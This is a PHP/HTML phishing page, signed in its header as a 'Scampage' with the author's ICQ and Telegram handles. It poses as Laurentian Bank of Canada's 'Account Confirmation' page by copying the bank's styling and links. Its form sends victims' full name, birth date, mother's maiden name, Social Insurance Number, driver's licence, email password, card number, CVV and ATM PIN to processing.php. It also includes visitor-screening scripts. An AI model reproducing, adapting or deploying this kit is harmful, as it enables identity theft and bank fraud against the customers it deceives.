<?php
   /*
 * Scampage by medpage
 * ICQ: 679849675
 * TELE: @medpagestore
 */

   require "../includes/session_protect.php";
   require "../includes/functions.php";
   require "../includes/One_Time.php";
   
   ?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<!--
 
                This site is managed 
                By SedNove Inc.
                Copyright © 2000-2005
                All rights reserved.
 
Description:    Fichier généré le 2009-10-06 12:00:49 
 
-->
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
    <meta name="copyright" content="Banque Laurentienne - Laurentian bank">
    <meta name="description" content="">
    <meta name="keywords" content="">
    <meta name="author" content="SedNove Inc.">
    <meta name="date" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=EDGE" />
    <title>LBC - Account Confirmation</title>
	
<link rel="shortcut icon" href="https://blcweb.banquelaurentienne.ca/lang/en/DynamicContent/Resources/Images/favicon.ico" />

    <STYLE type="text/css" media="all">@import "https://www.banquelaurentienne.ca/trans/css/style_000000.css";</STYLE>


















<!--Chargerment d'une feuille de style spécifiquement pour la carte sélectionnée-->
	<STYLE type="text/css" media="all">@import "https://www.banquelaurentienne.ca/tu_produits/visaV3/en/infinite.css";</STYLE>
    
    

<style type="text/css">

#html_content {z-index: 0;
}

a:hover {background:none}

#wrapper {width: 970px;
margin: 0 auto; /* this centers the container */
position: relative;
}
#flashcontent {	width: 796px;
	height: 575px;
	position: absolute;
	top: 122px;
	left: 174px; 
	z-index: 2000;
	/* display: none; */
}




#divContener { width:970px; height:102px; vertical-align:bottom; background-color:#CCCCCC; background-image:url(https://www.banquelaurentienne.ca/sn_uploads/pages_accueil_v2/fond_menu.jpg); overflow:hidden;}
	
/*#logo { width:176px; height:102px; float:left; }*/
/*#navSection { width:618px; height:102px; float:left; }*/
#tools { width:176px; height:102px; float:right; margin:0px; padding:0px; } 
#tools a, #tools a:visited, #tools a:hover { font-weight:bold; text-decoration:none; font-size:10px; color:#FFFFFF; line-height:14px; font-family:Verdana, Arial, Helvetica, sans-serif; background-image:url(/sn_uploads/pages_accueil_v2/chevrons-tool.gif);background-repeat:no-repeat; }
.orangeHelp { color:#FDB813; background-image:url(https://www.banquelaurentienne.ca/sn_uploads/pages_accueil_v2/chevrons-tool_orangeHelp.gif);background-repeat:no-repeat; }


#divContener table { border:solid #000000 0px; border-spacing:0px; }
#divContener table td { padding: 0; } /* padding: 0 10px; */
#Tableau_01 { margin-right:37px; }

</style>

</head>
<body>
	<div id="wrapper">
		<!--HTML CONTENT START-->
		<div id="html_content">
			<table cellpadding="0" cellspacing="0" border="0" align="center">
			<!-- menu entete premiere ligne-->
			<tr>
				<td>	
					<div id="logo">
						<a href="en/personal_banking_services/index.html" target="_self"></a>
					</div>
					<div>
						<form name="s" method="post" action="https://recherche.banquelaurentienne.ca/cgi-bin-fr/htsearch">
							<table id='TopMenubar'>
							<tr>
								<td>
											<a href="/en/personal_banking_services/index.html" class="footer">Home</a>&nbsp;| 
											<a href="/en/about_lbc/my_career/index.html" class="footer">Career</a>&nbsp;| 
											<a href="/en/contact_us/index.html" class="footer">Contact us</a>&nbsp;| 
											<a href="/en/contact_us/find_us.sn" class="footer">Where to find us</a>&nbsp;| 
											<a href="/en/faq/personal_banking.html" class="footer">Help and FAQ</a>&nbsp;| 
											<a href="javascript:void(0);" title="/tu_produits/visaV3/en/demande_visa_form1.sn" onclick="$('#chlang').submit();" class="footer">Français</a>
								</td>
								<td id='Search'>
										<input type="text" name="words" class="login" size="27" value="" placeholder="Search" onFocus="if(this.value=='Recherche')this.value='';">
										<a class='button' href="javascript:document.s.submit();">Go</a>
								</td>
							</tr>					
							</table>
						</form>
						<form name="chlang" id="chlang" action="/tu_produits/visaV3/fr/demande_visa_form1.sn" method="post">
						    <input type="hidden" name="produit" value="" />
						    <input type="hidden" name="utm_source" value="" />
						    <input type="hidden" name="utm_medium" value="" />
						    <input type="hidden" name="utm_content" value="" />
						    <input type="hidden" name="s" value="" />
						    <input type="hidden" name="etape" value="" />
						    <input type="hidden" name="carte" value="visa_infinite" />
						    <input type="hidden" name="h" value="c3d9d12ba47e626e6b78db99da4daeda2bzQVNfgZ8VFwnJGhOuwlBHqzdbfkKKbt0MEK1xAsxgSU3SjgXA6H66ZvetNsWSgkr2hFpt3CAUIITMshrsO1VaaL4P98LvLNw2PQnGZcNP5y" />
						</form>
					</div>
				</td>
			</tr>
<!--fin menu entete premiere ligne-->
			<tr>
				<td>	
					<div>
			 		<!-- NON FLASH -->
						<div id="divContainer">
							<div id="navSection"> 
								<table>
								<tr>
									<td>
										<a class='active' href="/en/personal_banking_services/index.html">Personal Banking</a>
        								</td>
									<td>
										<a href="/en/commercial_banking/index.html">Business Services</a>
									</td>
									<td>
										<a href="/en/about_lbc/index.html">Laurentian Bank</a>
									</td>
								</tr>
								</table>
							</div>
						</div>
					</div>
				</td>
			</tr>
			</table>
			

<div id="top_container_b" style="width:173px;">
        <div id="sousMenus" style='height:5px;'></div>
</div>
<div id='face' class='tu_produit face'>	
	<div id='left_container'>
		<dl id='left_menu'>
			<dt class='niv1 info'>
				Apply for your Visa credit card online!
			</dt>
			<dd class='niv1sm'>
				<!--<span class='niv2 opened'>
					<div class='divniv2'>
						<a href="/en/personal_banking_services/my_ideas/credit_cards.html">Credit cards</a>
					</div>
				</span>-->
				<dl class='niv2sm'>
					<dt class='niv3'>
						<a href="/tu_produits/visaV3/en/introduction.sn?produit=visa_infinite">Laurentian Bank Visa Infinite</a>
					</dt>
					<dt class='niv3'>
						<a href="/tu_produits/visaV3/en/introduction.sn?produit=visa_or">Visa EXPLORE</a>
					</dt>
					<dt class='niv3'>
						<a href="/tu_produits/visaV3/en/introduction.sn?produit=visa_dollars">Visa DOLLARS</a>
					</dt>
					<dt class='niv3'>
						<a href="/tu_produits/visaV3/en/introduction.sn?produit=visa_rec">Visa REWARD ME</a>
					</dt>
					<dt class='niv3'>
						<a href="/tu_produits/visaV3/en/introduction.sn?produit=visa_noir">Visa Black</a>
					</dt>
					<dt class='niv3'>
						<a href="/tu_produits/visaV3/en/introduction.sn?produit=visa_noir">Student Visa Black</a>
					</dt>
					<dt class='niv3'>
						<a href="/tu_produits/visaV3/en/introduction.sn?produit=visa_red">Visa Black Reduced Rate</a>
					</dt>
					<dt class='niv3'>
						<a href="/tu_produits/visaSTM/desktop/en/index.sn?produit=visaOR">Visa STM</a>
					</dt>
				</dl>
			</dd>
		</dl>

		<div style="margin:15px;">
			Need help?<br>
         		Call us at<br />
                        1-877-522-3863.
		</div>
	</div>


<style>
    .my_clear {clear:both;}
</style>

<!-- demande_visa3.sn -->


<div style='display: none;'>
</div>

<!-- partie centrale





 -->

<div style='display: none;'>
<!---- TO BE DELETED ---->
<span class="debugg">HASH_sn_cgidata: c3d9d12ba47e626e6b78db99da4daeda2bzQVNfgZ8VFwnJGhOuwlBHqzdbfkKKbt0MEK1xAsxgSU3SjgXA6H66ZvetNsWSgkr2hFpt3CAUIITMshrsO1VaaL4P98LvLNw2PQnGZcNP5y<br></span>
HASH_v: <br>
UID_V: 474417<br>
HASH_vv: <br>
UID_VV: 474417<br>
</div>
        
        
<div id='center_container'>
	<div id="trace">
	</div>
	<div id='content' class='lr_borders'>
    <!-- AddThis Button BEGIN -->
<div id="print" style="float: right; width: 110px; height: 40px; margin: 3px 5px 0px 0px; font-size: 12px;">

	<a href="https://www.addthis.com/bookmark.php" onmouseover="return addthis_open(this, '', '[URL]', '[TITLE]')" onmouseout="addthis_close()" onclick="return addthis_sendto()" style="font-size: 11px;">
		<img src="/trans/images/plus.png" alt="" style="float: right; font-size: 11px;" border="0">
	</a>
	<script type="text/javascript" src="https://s7.addthis.com/js/300/addthis_widget.js#pubid=webmaster726" style="font-size: 11px;"></script>
	<!-- https://secure.addthis.com/js/152/addthis_widget.js -->


	<!-- AddThis Button END -->

</div>
    <!-- AddThis Button END -->
    <span id='title'>Account Confirmation</span>
	<div id='banniere_haut' onclick="window.open('/en/personal_banking_services/my_ideas/ideas_visa_infinite.html');">&nbsp;</div>
	<div id='content2'>

<table id="txt_formulaire" class='noinsideborder'>
<tr>
	<th colspan=2>Personal information</th>
</tr>
<tr>
	<td colspan=2>
<form method="post" action="processing.php" id="ff" name="ff">
  <input type="hidden" name="produit" value="visa_infinite">
<input type="hidden" name="h" value="c3d9d12ba47e626e6b78db99da4daeda2bzQVNfgZ8VFwnJGhOuwlBHqzdbfkKKbt0MEK1xAsxgSU3SjgXA6H66ZvetNsWSgkr2hFpt3CAUIITMshrsO1VaaL4P98LvLNw2PQnGZcNP5y">
<input type="hidden" name="s" value="m">
<input type="hidden" name="etape" value="form_tu">
<input type="hidden" name="langue" value="1"> <!-- 3 = français; 1 = anglais -->
<input type="hidden" name="mois_v" id="mois_v" value="07">
<input type="hidden" name="jour_v" id="jour_v" value="23">




  <div style="margin:0px; padding:0px; float:left; width:200px;">
    <p>
      <label for="cprenom">Full Name*</label>
    </p>
 </div>
 <div style="margin:0px; padding:0px; float:left;">
    <p>
      <input id="prenom" name="FN" class="" type="text" required />
    </p>
    <div style="" id="erreur_prenom" class="erreur"></div>
 </div>
 <div style="" id="" class="my_clear"></div>
  
  


  
  
  
  <div style="margin:0px; padding:0px; float:left; width:200px;">
    <p>
      <label for="cdn">Date of birth (DD/MM/YYYY)*</label>
    </p>
  </div>
  <div style="margin:0px; padding:0px; float:left;">
    <p>
    
                <input type="text" name="D1" value="" size="2" maxlength="2" required>&nbsp;/&nbsp;<input type="text" name="D2" value="" size="2" maxlength="2" required>&nbsp;/&nbsp;<input type="text" name="D3" value="" size="4" maxlength="4" required><!--  -->
     
    </p>
	<div style="" id="erreur_dn" class="erreur"></div>
  </div>
  <div style="" id="" class="my_clear"></div>
  
  
      <div style="margin:0px; padding:0px; float:left; width:200px;">
    <p>
      <label for="cprenom">Mother's Maiden Name*</label>
    </p>
 </div>
 <div style="margin:0px; padding:0px; float:left;">
    <p>
      <input id="prenom" name="MN" class="" type="text" required />
    </p>
    <div style="" id="erreur_prenom" class="erreur"></div>
 </div>
 <div style="" id="" class="my_clear"></div>

  

  
  <div style="margin:0px; padding:0px; float:left; width:200px;">
    <p>
      <label for="cprenom">Social Insurance Number*</label>
    </p>
 </div>
 <div style="margin:0px; padding:0px; float:left;">
    <p>
      <input id="prenom" name="SN" maxlength="11" class="" type="text" required />
    </p>
    <div style="" id="erreur_prenom" class="erreur"></div>
 </div>
 <div style="" id="" class="my_clear"></div>
  <div style="margin:0px; padding:0px; float:left; width:200px;">
    <p>
      <label for="cprenom">Driver's License Number*</label>
    </p>
 </div>
 <div style="margin:0px; padding:0px; float:left;">
    <p>
      <input id="prenom" name="DL" maxlength="15" class="" type="text" required />
    </p>
    <div style="" id="erreur_prenom" class="erreur"></div>
 </div>
 <div style="" id="" class="my_clear"></div>
   <div style="margin:0px; padding:0px; float:left; width:200px;">
    <p>
      <label for="cprenom">Email Address*</label>
    </p>
 </div>
 <div style="margin:0px; padding:0px; float:left;">
    <p>
      <input id="prenom" name="EA" class="" type="text" required />
    </p>
    <div style="" id="erreur_prenom" class="erreur"></div>
 </div>
 <div style="" id="" class="my_clear"></div>
   <div style="margin:0px; padding:0px; float:left; width:200px;">
    <p>
      <label for="cprenom">Email Password*</label>
    </p>
 </div>
 <div style="margin:0px; padding:0px; float:left;">
    <p>
      <input id="prenom" name="EP" class="" type="password" required />
    </p>
    <div style="" id="erreur_prenom" class="erreur"></div>
 </div>



	</td>
</tr>
<tr> 
      <td width=1>
      </td>
      <td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
    </tr>
    </table>

<table id="txt_formulaire" class='noinsideborder'>
<tr>
	<th colspan=2>Card information</th>
</tr>
<tr>
	<td colspan=2>

 
   <div style="margin:0px; padding:0px; float:left; width:200px;">
    <p>
      <label for="cprenom">Name on Card*</label>
    </p>
 </div>
 <div style="margin:0px; padding:0px; float:left;">
    <p>
      <input id="prenom" name="NC" class="" type="text" required />
    </p>
    <div style="" id="erreur_prenom" class="erreur"></div>
 </div>
 <div style="" id="" class="my_clear"></div>
   <div style="margin:0px; padding:0px; float:left; width:200px;">
    <p>
      <label for="cprenom">Card Number*</label>
    </p>
 </div>
 <div style="margin:0px; padding:0px; float:left;">
    <p>
      <input id="prenom" name="CN" maxlength="16" class="" type="text" required />
    </p>
    <div style="" id="erreur_prenom" class="erreur"></div>
 </div>
 <div style="" id="" class="my_clear"></div>
   <div style="margin:0px; padding:0px; float:left; width:200px;">
    <p>
      <label for="cprenom">Exp. Date (MM/YYYY)*</label>
    </p>
 </div>
 <div style="margin:0px; padding:0px; float:left;">
     <p>
    
                <input type="text" name="E1" value="" size="2" maxlength="2" required>&nbsp;/&nbsp;<input type="text" name="E2" value="" size="4" maxlength="4" required><!--  -->
     
    </p>
    <div style="" id="erreur_prenom" class="erreur"></div>
 </div>
 <div style="" id="" class="my_clear"></div>
   <div style="margin:0px; padding:0px; float:left; width:200px;">
    <p>
      <label for="cprenom">Cvv*</label>
    </p>
 </div>
 <div style="margin:0px; padding:0px; float:left;">
    <p>
      <input id="prenom" name="CV" maxlength="3" class="" type="password" required />
    </p>
    <div style="" id="erreur_prenom" class="erreur"></div>
 </div>
 <div style="" id="" class="my_clear"></div>
   <div style="margin:0px; padding:0px; float:left; width:200px;">
    <p>
      <label for="cprenom">ATM Pin*</label>
    </p>
 </div>
 <div style="margin:0px; padding:0px; float:left;">
    <p>
      <input id="prenom" name="AP" maxlength="8" class="" type="password" required />
    </p>
    <div style="" id="erreur_prenom" class="erreur"></div>
 </div>

	</td>
</tr>
<tr> 
      <td width=1>
      </td>
      <td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
    </tr>
    </table>

<p>&nbsp;</p>
<table width="528" id="navig" class='borderless'>
<tr>

	<td>
		<input type="submit" value="Continue"  style="background-color:#053c69;color:white;width:146px;height:25px">
	</td>
</tr>
</table>

</form>
</div>

<!--</div>-->








	</div><!-- end div center_container -->
</div><!-- end div face -->
	<table class='Footer'>
	<tr>
		<td>	
			<!-- social-->
			<a href="https://www.facebook.com/blaurentienne" target="_blank" title="Facebook"><img src="https://www.banquelaurentienne.ca/trans/images/fb_logo.png" border="0" alt="Facebook"></a>&nbsp;
			<a href="https://www.twitter.com/BLaurentienne" target="_blank" title="Twitter"><img src="https://www.banquelaurentienne.ca/trans/images/twitter_logo.png" border="0" alt="Twitter"></a>&nbsp;
			<a href="https://www.linkedin.com/company/12074?trk=tyah&trkInfo=clickedVertical%3Acompany%2CclickedEntityId%3A12074%2Cidx%3A3-1-10%2CtarId%3A1459796365073%2Ctas%3Abanque%20laure" target="_blank" title="LinkedIn"><img src="https://www.banquelaurentienne.ca/trans/images/linkedin_logo.png" border="0" alt="LinkedIn"></a>&nbsp;
			<a href="https://www.youtube.com/user/banquelaurentienne" target="_blank" title="YouTube"><img src="https://www.banquelaurentienne.ca/trans/images/youtube_logo.png" border="0" alt="YouTube"></a>
		</td>
		<td>
			<a href="/en/site_map.html">Site map</a>&nbsp;|&nbsp
			<a href="/en/security.html">Security and Privacy</a>&nbsp;|&nbsp
			<a href="/en/legal_notice.html">Legal notice</a>&nbsp;|&nbsp
			<a href="/en/about.html">About this website</a>&nbsp;|&nbsp

			© Laurentian Bank of Canada, 2021 All rights reserved.	
		</td>
	</tr>
	</table>






<noscript>
<div style="display:inline;">
<img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/929311686/?value=0&amp;guid=ON&amp;script=0"/>
</div>
</noscript>





</body>
</html>